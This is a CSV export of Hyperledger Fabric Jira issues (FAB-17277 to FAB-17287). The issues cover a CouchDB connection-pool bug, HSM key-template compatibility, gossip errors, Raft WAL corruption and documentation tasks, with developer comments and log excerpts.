Obviously, mgr_test should import golang protobuf",,jacklightChen,mastersingh24,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,(Please add high level design or a link to the design),Unset,Unset,Unset,,,,,No,,Unset,No,,,"1|i016ij:",,,,Unset,Unset,,(Please add steps to reproduce),,Unset,,,,,,Unset,,Unset,,(Please add usage information),jacklightChen,mastersingh24,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"17/Dec/19 9:28 PM;mastersingh24;[https://github.com/hyperledger/fabric/pull/428];;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Too many TCP connections and no reuse of connection pool,FAB-17277,43746,,Bug,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,Senthil1,Senthil1,Senthil1,17/Dec/19 8:21 PM,12/Feb/20 1:46 AM,28/Oct/23 3:09 AM,12/Feb/20 1:46 AM,,,,,,,,,,v1.4.5,v2.0.0,,,fabric-ledger,,,,,,,,,0,,,,,,"When the CouchDB is used as the StateDB, we observe too many TCP connections at the {{time_wait}} state.

$ {{netstat -n | grep -i 5984 | grep -i time_wait | wc -l}}
 {{34000}}

As the {{/proc/sys/net/ipv4/tcp_fin_timeout}} (i.e., keep-alive timeout) is usually set to 60 seconds in the Linux server, we quickly get into the following error when the peer tries to access the CouchDB:

{{connect: cannot assign requested address}}

*Reason for the above behavior.* The peer creates a large number of TCP connections to CouchDB because the default reusable connection pool size is 2 per host while the max pool size is 100 (combining all hosts) – refer to [transport.go|https://github.com/golang/go/blob/master/src/net/http/transport.go] and [golang http doc|https://golang.org/pkg/net/http/]. Thus only 2 TCP connections can be reused by the peer when it accesses CouchDB. When more than two goroutines in the peer try to simultaneously access the CouchDB, it results in new non-reusable connections (i.e., creation of new TCP connection outside the pool). Hence, when the peer runs for around 30 seconds at a high load, it results in too many TCP connections at the {{{{time_wait}}}} state.

*Fix:* We need set {{MaxIdleConns}} and {{MaxIdleConnsPerHost}} to 2000. This would create 2000 TCP connections in the pool and it would be reused whenever the peer accesses the CouchDB. As the peer is the only host for the CouchDB, we set the same value for both parameters.",,denyeart,Senthil1,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,(Please add high level design or a link to the design),Unset,Unset,Unset,,,,,No,,Unset,No,,,"1|i016j7:",,,,Unset,Unset,,(Please add steps to reproduce),,Unset,,,,,,Unset,,Unset,,(Please add usage information),denyeart,Senthil1,,,,,,,,,,,,,mergify/bp/release-2.2/pr-4374,release-1.4,release-2.5,release-2.4,main,mergify/bp/release-2.2/pr-3750,mergify/bp/release-2.5/pr-3782,mergify/bp/release-2.4/pr-3646,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,true,"11/Feb/20 5:03 AM;denyeart;https://github.com/hyperledger/fabric/pull/429 merged into master for v2.0.

This bug fix looks important and low risk enough for a backport to v1.4.5.;;;","12/Feb/20 1:46 AM;denyeart;Merged in release-1.4 for v1.4.5.;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Adding a new Org to an existing channel/network,FAB-17278,43752,,Documentation,Closed,FAB,Fabric,software,denyeart,,,Medium,Duplicate,,ashish.cppdev,ashish.cppdev,18/Dec/19 12:48 AM,08/Apr/20 1:56 AM,28/Oct/23 3:09 AM,08/Apr/20 1:56 AM,,,,,,,,,,,,,,,,,,,,,,,0,,,,,,"Hi,

 

Can someone please point me to sample code that will enable me to add a new organization to an existing network/channel using the Node API?

We followed the example fabric-samples org1 and org2. We also followed the [https://hyperledger-fabric.readthedocs.io/en/release-1.4/channel_update_tutorial.html] to add Org 3. 

 

Now, what we want to know is what are the Fabric Node APIs we can use to accomplish this without having to bring down the network, unlike the example which I have quoted in the link above, which requires a stop and restart.

 

Thank you",,ashish.cppdev,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,(Please add high level design or a link to the design),Unset,Unset,Unset,,,,,No,,Unset,No,,,"1|i016kb:",,,,Unset,Unset,,(Please add steps to reproduce),,Unset,,,,,,Unset,,Unset,,(Please add usage information),ashish.cppdev,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Service discovery should consider collection-level endorsement policies,FAB-17279,43754,,Story,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,yacovm,denyeart,denyeart,18/Dec/19 2:35 AM,16/Apr/20 3:53 AM,28/Oct/23 3:09 AM,16/Apr/20 3:53 AM,,,,,,,,,,v2.1.0,,,,fabric-ledger,fabric-peer,,,,,,,,0,,,,,,"In v2.0 an option to specify endorsement policy at collection level is added. Therefore service discovery for endorsements at collection level also needs to take the collection level endorsement policy into consideration.

This will require an API to get endorsement policy given chaincode and collection name.",,denyeart,yacovm,,,,,,,,,,,,,,,,,,,,,,,,,,,,,FAB-17368,,,,,,,,,,,,,,,,FAB-15066,,,,,,,,,,,,,,,,,,,,,,,,,,(Please add high level design or a link to the design),Unset,Unset,Unset,,,,,No,,Unset,No,,,"1|i00wur:1",,,,Unset,Unset,v2.x,(Please add steps to reproduce),,Unset,,,,,,Unset,,Unset,,(Please add usage information),denyeart,yacovm,,,,,,,,,,,,,mergify/bp/release-2.2/pr-4374,release-2.5,release-2.4,main,mergify/bp/release-2.5/pr-3782,mergify/bp/release-2.2/pr-3750,mergify/bp/release-2.4/pr-3646,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,true,"18/Dec/19 2:43 AM;yacovm;This shouldn't be too hard, as discovery simply relies on a one method interface:
{code}
type chaincodeMetadataFetcher interface {
	// ChaincodeMetadata returns the metadata of the chaincode as appears in the ledger,
	// or nil if the channel doesn't exist, or the chaincode isn't found in the ledger
	Metadata(channel string, cc string, loadCollections bool) *chaincode.Metadata
}
{code}

To retrieve the endorsement policy and the collection config. 
If we extend it to have a collection (or an empty string if no collection) parameter as well which puts in the endorsement policy in the Metadata the EP according to whether the collection level EP is set or not, then things should work, as long as the current code works properly. 

I'll try this approach and see where it gets us.;;;","02/Jan/20 11:53 PM;yacovm;https://github.com/hyperledger/fabric/pull/445 
[~denyeart] I need someone to work its way from the fabric lifecycle side... ;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Remove CKA_PRIVATE from pubkeyT to broaden compatibility with HSMs,FAB-17280,43755,,Bug,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,caduellery,caduellery,caduellery,18/Dec/19 3:05 AM,18/Dec/19 9:02 PM,28/Oct/23 3:09 AM,18/Dec/19 9:02 PM,v1.4.0,v1.4.1,v1.4.2,v1.4.3,,,,,,v2.0.0,,,,,,,,,,,,,0,bccsp,fabric-ca,HSM,,,"I was trying to integrate fabric-ca with an HSM, but right at the key pair generation function I was getting the error ""*0x13: CKR_ATTRIBUTE_VALUE_INVALID*"" ([^fabric-ca-hsm.log] attached).

Fiddling with the templates passed on to the keypair generating function, I've found that commenting out the line #217 (*CKA_PRIVATE, false*) from fabric/bccsp/pkcs11.go the problem doesn't occur and the key pair is correctly generated by the HSM. So, with this line commented out, the attribute assumes a default value of *true* on my HSM. For some reason it doesn't accept the template of the public key being set with ""CKA_PRIVATE=false"".

At first seems weird to have a public key with an attribute called ""PRIVATE"" set true. But searching about this topic, I've found that CKA_PRIVATE isn't the attr that defines a private key as stated in:
 # The [4.4 Storage Objects|http://docs.oasis-open.org/pkcs11/pkcs11-base/v2.40/errata01/os/pkcs11-base-v2.40-errata01-os-complete.html#_Toc441755768] section of Cryptoki Base Specification: ??_""When the CKA_PRIVATE attribute is CK_TRUE, a user may not access the object *until the user has been authenticated* to the token.""_??
 # The [4.9 Private key objects|http://docs.oasis-open.org/pkcs11/pkcs11-base/v2.40/errata01/os/pkcs11-base-v2.40-errata01-os-complete.html#_Toc441755782] section: ??_""The CKA_ALWAYS_AUTHENTICATE attribute can be used to force re-authentication (i.e. force the user to provide a PIN) for each use of a private key. “Use” in this case means a cryptographic operation such as sign or decrypt. This attribute may only be set to CK_TRUE *when CKA_PRIVATE is also CK_TRUE*.""_??

So it seems that if *any* storage object is set with CKA_PRIVATE=CK_TRUE, only an authenticated HSM/Token user can access this object. Doesn't matter if an object is a *private key* or a *public key*, the Cryptoki specification considers CKA_PRIVATE as a common Storage Object attribute that defines a kind of access level a user may have to that object.

There is another attribute that defines if a key object is the public or private member of a pair, and this is the *CKA_CLASS* attr, that may have the values of *CKO_PUBLIC_KEY*, *CKO_PRIVATE_KEY* or *CKO_SECRET_KEY*.

Saw that the FAB-5407 issue was about changing the CKA_PRIVATE attr from ""true"" to ""false"" for compatibility with another HSM. At that time the reporter mention that commenting out the line does work for his HSM too. *So, what about remove this line for broader compatibility with HSMs?* Also, the [Cryptoki specification reference implementation for the pubkey template|http://docs.oasis-open.org/pkcs11/pkcs11-base/v2.40/errata01/os/pkcs11-base-v2.40-errata01-os-complete.html#_Toc441755812http://docs.oasis-open.org/pkcs11/pkcs11-base/v2.40/errata01/os/pkcs11-base-v2.40-errata01-os-complete.html#_Toc441755812] doesn't have an CKA_PRIVATE defined.

Tested this change with SoftHSMv2 and there is no impact too.",,caduellery,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,FAB-5407,,,,,,,,,"18/Dec/19 2:20 AM;caduellery;fabric-ca-hsm.log;https://jira.hyperledger.org/secure/attachment/18038/fabric-ca-hsm.log",,,,,,,,,,,,,,,,,(Please add high level design or a link to the design),Unset,Unset,Unset,,,,,No,,Unset,No,,,"1|i016kr:",,,,Unset,Unset,,"1. Have a Dinamo Networks HSM;
2. Compile and install fabric-ca with PKCS11 support for HSM integration;
3. Try to Initialize fabric-ca-server with the following env vars exported:
DFENCE_PKCS11_IP=<HSM-IP-ADDR>
DFENCE_PKCS11_USER=<HSM-USER>
DFENCE_PKCS11_SPECIAL_PWD=<PASSWD>",,Unset,,,,,,Unset,,Unset,,(Please add usage information),caduellery,,,,,,,,,,,,,,mergify/bp/release-2.2/pr-4374,release-2.5,release-2.4,main,mergify/bp/release-2.2/pr-3750,mergify/bp/release-2.5/pr-3782,mergify/bp/release-2.4/pr-3646,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,true,"18/Dec/19 3:28 AM;caduellery;Related pull request: [https://github.com/hyperledger/fabric/pull/432];;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Gossip errors - Tries to connect to deleted peer endpoint. Could not connect to Endpoint:xxxx` errors. ,FAB-17281,43757,,Bug,Closed,FAB,Fabric,software,denyeart,,,Medium,Invalid: Works as Expected,,nileshdeotale,nileshdeotale,18/Dec/19 3:49 AM,18/Dec/19 6:03 AM,28/Oct/23 3:09 AM,18/Dec/19 6:03 AM,v1.4.4,,,,,,,,,,,,,fabric-gossip,fabric-peer,,,,,,,,0,gossip,,,,,"on deleting a peer, and given that, the deleted peer could be on one or more channels, how does service discovery ""remove"" it from ""discovered"" peers list from all other orgs that learnt about it.

Reason I ask is, I see below gossip errors in an orgpeer that tries to reach another peer which has been deleted and no longer exists. 

```
 019-12-17 18:20:22.667 UTC [gossip.gossip] func1 -> WARN 722 Deep probe of nilesh1217-peerwithnonpeerenrollid-peer.nileshopenshifttesting-0defdaa0c51bd4a2dcb024eab4bf04a1-0001.us-south.containers.appdomain.cloud:443 failed: context deadline exceeded[github.com/hyperledger/fabric/gossip/gossip.(*gossipServiceImpl).learnAnchorPeers.func1|http://github.com/hyperledger/fabric/gossip/gossip.(*gossipServiceImpl).learnAnchorPeers.func1]

/go/src/github.com/hyperledger/fabric/gossip/gossip/gossip_impl.go:251[github.com/hyperledger/fabric/gossip/discovery.(*gossipDiscoveryImpl).Connect.func1|http://github.com/hyperledger/fabric/gossip/discovery.(*gossipDiscoveryImpl).Connect.func1]

/go/src/github.com/hyperledger/fabric/gossip/discovery/discovery_impl.go:153
 runtime.goexit
 /usr/local/go1.12.13b4/src/runtime/asm_amd64.s:1337
 2019-12-17 18:20:22.667 UTC [gossip.discovery] func1 -> WARN 723 Could not connect to Endpoint: nilesh1217-peerwithnonpeerenrollid-peer.nileshopenshifttesting-0defdaa0c51bd4a2dcb024eab4bf04a1-0001.us-south.containers.appdomain.cloud:443, InternalEndpoint: nilesh1217-peerwithnonpeerenrollid-peer.nileshopenshifttesting-0defdaa0c51bd4a2dcb024eab4bf04a1-0001.us-south.containers.appdomain.cloud:443, PKI-ID: <nil>, Metadata: : context deadline exceeded
  
 [1:30 PM|https://ibm-blockchain.slack.com/archives/GE5M0TJGJ/p1576607457005300]
  ```",,nileshdeotale,yacovm,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,(Please add high level design or a link to the design),Unset,Unset,Unset,,,,,No,,Unset,No,,,"1|i016l7:",,,,Unset,Unset,,"Create a 2 Org network
Join 2 peers from each org to a channel
make atleast one peer as anchor peer in each org
delete one of the peers 
check logs for all other peers.
you will see gossip `Could not connect to Endpoint:xxxx` errors 

",,Unset,,,,,,Unset,,Unset,,(Please add usage information),nileshdeotale,yacovm,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"18/Dec/19 6:03 AM;yacovm;It will remove it after enough time passes. Give it an hour or so... it obviously doesn't know it is running in docker and that you deleted it ;) ;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
the description of this repository is blank,FAB-17282,43759,,Task,Closed,FAB,Fabric,software,denyeart,,,High,Done,,jacklightChen,jacklightChen,18/Dec/19 10:14 AM,21/Dec/19 2:10 PM,28/Oct/23 3:09 AM,21/Dec/19 2:10 PM,,,,,,,,,,,,,,,,,,,,,,,0,,,,,,"when i pinned fabric repository, i found its description is blank.

may add a brief intro(not just a link) , so it looks more nature

!WX20191218-091200@2x.png|width=1399,height=221!",,jacklightChen,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"18/Dec/19 10:13 AM;jacklightChen;WX20191218-091200@2x.png;https://jira.hyperledger.org/secure/attachment/18041/WX20191218-091200%402x.png",,,,,,,,,,,,,,,,,(Please add high level design or a link to the design),Unset,Unset,Unset,,,,,No,,Unset,No,,,"1|i016ln:",,,,Unset,Unset,,(Please add steps to reproduce),,Unset,,,,,,Unset,,Unset,,(Please add usage information),jacklightChen,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Force follower to sync if its wal data is corrupte,FAB-17283,43760,,Task,Closed,FAB,Fabric,software,denyeart,,,Medium,Won't Do,guoger,guoger,guoger,18/Dec/19 12:05 PM,19/Apr/21 12:49 AM,28/Oct/23 3:09 AM,19/Apr/21 12:49 AM,,,,,,,,,,,,,,fabric-docs,fabric-orderer,,,,,,,,0,Raft,,,,,"Sometimes, wal data of a Raft node could be corrupt, in which case node would panic with:
{code}
[35m2019-12-10 13:06:22.537 UTC [orderer.consensus.etcdraft] commitTo -> PANI 020[0m tocommit(8) is out of range [lastIndex(3)]. Was the raft log corrupted, truncated, or lost? channel=ordererchannel node=3
panic: tocommit(8) is out of range [lastIndex(3)]. Was the raft log corrupted, truncated, or lost?

goroutine 38 [running]:
github.com/hyperledger/fabric/vendor/go.uber.org/zap/zapcore.(*CheckedEntry).Write(0xc0001773f0, 0x0, 0x0, 0x0)
	/opt/gopath/src/github.com/hyperledger/fabric/vendor/go.uber.org/zap/zapcore/entry.go:229 +0x515
github.com/hyperledger/fabric/vendor/go.uber.org/zap.(*SugaredLogger).log(0xc00000e0f8, 0x4, 0x105c6a2, 0x5d, 0xc0003a9800, 0x2, 0x2, 0x0, 0x0, 0x0)
	/opt/gopath/src/github.com/hyperledger/fabric/vendor/go.uber.org/zap/sugar.go:234 +0xf6
github.com/hyperledger/fabric/vendor/go.uber.org/zap.(*SugaredLogger).Panicf(0xc00000e0f8, 0x105c6a2, 0x5d, 0xc0003a9800, 0x2, 0x2)
	/opt/gopath/src/github.com/hyperledger/fabric/vendor/go.uber.org/zap/sugar.go:159 +0x79
github.com/hyperledger/fabric/common/flogging.(*FabricLogger).Panicf(0xc00000e100, 0x105c6a2, 0x5d, 0xc0003a9800, 0x2, 0x2)
	/opt/gopath/src/github.com/hyperledger/fabric/common/flogging/zap.go:74 +0x60
github.com/hyperledger/fabric/vendor/go.etcd.io/etcd/raft.(*raftLog).commitTo(0xc00014dab0, 0x8)
	/opt/gopath/src/github.com/hyperledger/fabric/vendor/go.etcd.io/etcd/raft/log.go:203 +0x14d
github.com/hyperledger/fabric/vendor/go.etcd.io/etcd/raft.(*raft).handleHeartbeat(0xc0002ac140, 0x8, 0x3, 0x2, 0x5, 0x0, 0x0, 0x0, 0x0, 0x0, ...)
	/opt/gopath/src/github.com/hyperledger/fabric/vendor/go.etcd.io/etcd/raft/raft.go:1324 +0x54
github.com/hyperledger/fabric/vendor/go.etcd.io/etcd/raft.stepFollower(0xc0002ac140, 0x8, 0x3, 0x2, 0x5, 0x0, 0x0, 0x0, 0x0, 0x0, ...)
	/opt/gopath/src/github.com/hyperledger/fabric/vendor/go.etcd.io/etcd/raft/raft.go:1269 +0x450
github.com/hyperledger/fabric/vendor/go.etcd.io/etcd/raft.(*raft).Step(0xc0002ac140, 0x8, 0x3, 0x2, 0x5, 0x0, 0x0, 0x0, 0x0, 0x0, ...)
	/opt/gopath/src/github.com/hyperledger/fabric/vendor/go.etcd.io/etcd/raft/raft.go:971 +0x12db
github.com/hyperledger/fabric/vendor/go.etcd.io/etcd/raft.(*node).run(0xc0002200c0, 0xc0002ac140)
	/opt/gopath/src/github.com/hyperledger/fabric/vendor/go.etcd.io/etcd/raft/node.go:357 +0x1101
created by github.com/hyperledger/fabric/vendor/go.etcd.io/etcd/raft.RestartNode
	/opt/gopath/src/github.com/hyperledger/fabric/vendor/go.etcd.io/etcd/raft/node.go:246 +0x31b
{code}


We currently have two options here:
- remove node from consenter set and readd (correct solution)
- kill current leader, and the new leader has a fresh cache of follower's commit index, and effectively giving them a chance to catch up (violating safety property of Raft protocol)

Both of them are somewhat cumbersome. It would be nice to force follower to catch up instead of panic, even if some manual data transferring is needed",,denyeart,guoger,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,FAB-18089,,,,,,,,,,,,,,,,,,,,,,,(Please add high level design or a link to the design),Unset,Unset,Unset,,,,,No,,Unset,No,,,"1|i016lv:",,,,Unset,Unset,,(Please add steps to reproduce),,Unset,,,,,,Unset,,Unset,,(Please add usage information),denyeart,guoger,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"23/Dec/19 6:45 PM;guoger;This can actually be achieved without modifying code. User needs to copy a snapshot from alive node. Updated docs to include methods to fix missing wal: https://github.com/hyperledger/fabric/pull/442;;;","17/Apr/21 12:36 AM;denyeart;The PR never got merged, need to re-visit.;;;","19/Apr/21 12:49 AM;guoger;I'm going to close this issue for now, since this problem is not brought up very often anymore.;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Move network-spec and test-input files to test data root folder,FAB-17284,43767,,Task,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,bharadwajambati1,bharadwajambati1,bharadwajambati1,19/Dec/19 12:39 AM,29/Jan/20 1:01 PM,28/Oct/23 3:09 AM,22/Jan/20 3:20 AM,v2.0.0,,,,,,,,,v2.0.0,,,,fabric-quality,,,,,,,,,0,,,,,,,,bharadwajambati1,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,FAB-16064,,,,,,,,,,,,,,,,,,,,,,,,,,(Please add high level design or a link to the design),Unset,Unset,Unset,,,,,No,,Unset,No,,,"1|i00uze:rzczqzxyzzw",,,,Unset,Unset,In Progress,(Please add steps to reproduce),,Unset,,,,,,Unset,,Unset,,(Please add usage information),bharadwajambati1,,,,,,,,,,,,,,dependabot/go_modules/regression/publish/golang.org/x/sys-0.1.0,dependabot/go_modules/chaincodes/marbles02_private/go/golang.org/x/crypto-0.1.0,dependabot/go_modules/tools/operator/k8s.io/client-go-0.20.0,dependabot/go_modules/regression/smoke/golang.org/x/net-0.7.0,dependabot/go_modules/tools/chaincode-integration/resources/chaincode/simple-go/golang.org/x/net-0.7.0,dependabot/go_modules/regression/barebones/golang.org/x/net-0.7.0,dependabot/go_modules/tools/gotools/golang.org/x/sys-0.1.0,dependabot/go_modules/regression/smoke/github.com/docker/docker-20.10.24incompatible,dependabot/go_modules/tools/operator/golang.org/x/crypto-0.1.0,dependabot/go_modules/regression/smoke/github.com/opencontainers/runc-1.1.5,dependabot/go_modules/regression/publish/golang.org/x/text-0.3.8,dependabot/go_modules/regression/publish/github.com/opencontainers/runc-1.1.5,release-1.4,dependabot/go_modules/regression/smoke/golang.org/x/text-0.3.8,release-2.5,lindluni-patch-1,dependabot/go_modules/regression/publish/k8s.io/client-go-0.20.0,dependabot/go_modules/regression/barebones/github.com/opencontainers/runc-1.1.5,release-2.4,dependabot/go_modules/regression/basicnetwork/k8s.io/client-go-0.20.0,dependabot/go_modules/tools/chaincode-integration/resources/chaincode/simple-go/golang.org/x/text-0.3.8,dependabot/go_modules/regression/publish/golang.org/x/net-0.7.0,dependabot/go_modules/regression/basicnetwork/golang.org/x/crypto-0.1.0,dependabot/go_modules/regression/publish/golang.org/x/crypto-0.1.0,dependabot/go_modules/regression/barebones/github.com/docker/docker-20.10.24incompatible,dependabot/go_modules/tools/operator/golang.org/x/sys-0.1.0,dependabot/go_modules/regression/basicnetwork/golang.org/x/net-0.7.0,dependabot/go_modules/regression/smoke/golang.org/x/sys-0.1.0,dependabot/go_modules/regression/basicnetwork/github.com/opencontainers/runc-1.1.5,dependabot/go_modules/regression/barebones/golang.org/x/text-0.3.8,revert-342-mergify/bp/main/pr-340,dependabot/go_modules/regression/basicnetwork/golang.org/x/sys-0.1.0,dependabot/go_modules/regression/publish/github.com/docker/docker-20.10.24incompatible,dependabot/go_modules/regression/smoke/k8s.io/client-go-0.20.0,dependabot/go_modules/regression/basicnetwork/github.com/docker/docker-20.10.24incompatible,dependabot/go_modules/tools/operator/golang.org/x/text-0.3.8,dependabot/go_modules/tools/operator/golang.org/x/net-0.7.0,dependabot/go_modules/regression/basicnetwork/golang.org/x/text-0.3.8,dependabot/go_modules/regression/smoke/golang.org/x/crypto-0.1.0,dependabot/go_modules/regression/barebones/golang.org/x/crypto-0.1.0,dependabot/go_modules/regression/barebones/golang.org/x/sys-0.1.0,dependabot/go_modules/tools/operator/github.com/opencontainers/runc-1.1.5,dependabot/go_modules/regression/barebones/k8s.io/client-go-0.20.0,dependabot/go_modules/chaincodes/marbles02_private/go/golang.org/x/net-0.7.0,dependabot/go_modules/tools/operator/github.com/docker/docker-20.10.24incompatible,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,true,"14/Jan/20 3:05 AM;bharadwajambati1;[https://github.com/hyperledger/fabric-test/pull/22/commits/79859bf08c014a1f60491878099c53d0e58b933f];;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
"Joining an already created channel indicates that the ledger creation failed,",FAB-17285,43772,,Bug,Closed,FAB,Fabric,software,denyeart,,,Medium,Invalid: Works as Expected,,rxdqqqq,rxdqqqq,19/Dec/19 2:35 PM,03/Jan/20 3:50 AM,28/Oct/23 3:09 AM,03/Jan/20 3:50 AM,v2.0.0,,,,,,,,,,,,,fabric-ledger,fabric-peer,fabric-samples,,,,,,,0,,,,,,"When i start BYFN and after executing to join the channel through cli container,When I exit the cli container and re-enter the cli container trying to join the channel,But it reminds me that I cannot create the ledger.
",,anhngo,denyeart,rxdqqqq,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"19/Dec/19 2:34 PM;rxdqqqq;WX20191219-133411@2x.png;https://jira.hyperledger.org/secure/attachment/18043/WX20191219-133411%402x.png",,,,,,,,,,,,,,,,,(Please add high level design or a link to the design),Unset,Unset,Unset,,,,,No,,Unset,No,,,"1|i016ob:",,,,Unset,Unset,,"1. Generate certificate, Genesis.Block channel.tx
2.docker-compose -f docker-compose.cli.yaml -f docker-compose-etcdraft2.yaml up -d
3.docker exec -it cli bash
4.Configure environment variables as peer0.org1.example.com
5.create channel and join channel
6. exit cli container
7. docker exec -it cli bash
8.Configure environment variables as peer0.org1.example.com
9. join channel
10. console remind me :-----bad proposal response 500: cannot create ledger from genesis block: LedgerID already exists)",,Unset,,,,,,Unset,,Unset,,(Please add usage information),anhngo,denyeart,rxdqqqq,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"03/Jan/20 3:50 AM;denyeart;[~rxdqqqq] This is the expected behavior, since you cannot join a peer to a channel twice. I will close as working as expected. If you still believe there is a problem here that needs to be fixed, please re-open and explain.;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Improve CI Testing,FAB-17286,43774,,Task,Closed,FAB,Fabric,software,denyeart,,,Medium,Won't Do,btl5037,btl5037,btl5037,19/Dec/19 7:26 PM,11/Jan/20 6:33 AM,28/Oct/23 3:09 AM,11/Jan/20 6:33 AM,,,,,,,,,,,,,,,,,,,,,,,0,,,,,,"Improve unit tests by implementing JUnit reports and utilize gotestsum to improve test output

 ",,btl5037,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,(Please add high level design or a link to the design),Unset,Unset,Unset,,,,,No,,Unset,No,,,"1|i016or:",,,,Unset,Unset,,(Please add steps to reproduce),,Unset,,,,,,Unset,,Unset,,(Please add usage information),btl5037,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Update docs for wallets to match v2.0 API,FAB-17287,43775,,Story,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,bestbeforetoday,bestbeforetoday,bestbeforetoday,19/Dec/19 8:55 PM,18/Jan/20 12:29 PM,28/Oct/23 3:09 AM,18/Jan/20 12:29 PM,v2.0.0,,,,,,,,,,,,,fabric-docs,fabric-sdk-java,,,,,,,,0,programmingModel,sdk-triaged,,,,"The types section of [https://hyperledger-fabric.readthedocs.io/en/master/developapps/wallet.html] needs updating to match the new wallet API and structure in v2.0 of the Node (and Java) SDK. The key differences are:
 * Wallet types are defined only by their backing store, not by the type (HSM or non-HSM) of identity they hold.
 * There are three wallet types: file system, in-memory and CouchDB.
 * All wallet types can hold both HSM and non-HSM identities.
 * All of the wallet types are created using factory function on the new Wallets class. Individual implementation classes are not exposed.

 

All of the above information is captured on a new tutorial page in the SDK docs: [https://hyperledger.github.io/fabric-sdk-node/master/tutorial-wallet.html]

Hyperlinks to wallet information on that page are all out-of-date. Node SDK documentation is now located at [https://hyperledger.github.io/fabric-sdk-node/master/]",,bestbeforetoday,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,FABN-1353,,,,,,,,,,,,,,,,,,,,,,,,,,(Please add high level design or a link to the design),Unset,Yes,Unset,,,,,No,,Unset,No,,,"1|i016q3:",,,,Unset,Unset,,(Please add steps to reproduce),,Unset,,,,,,Unset,,Unset,,(Please add usage information),bestbeforetoday,,,,,,,,,,,,,,mergify/bp/release-2.2/pr-4374,release-2.5,release-2.4,main,mergify/bp/release-2.5/pr-3782,mergify/bp/release-2.2/pr-3750,mergify/bp/release-2.4/pr-3646,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,true,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
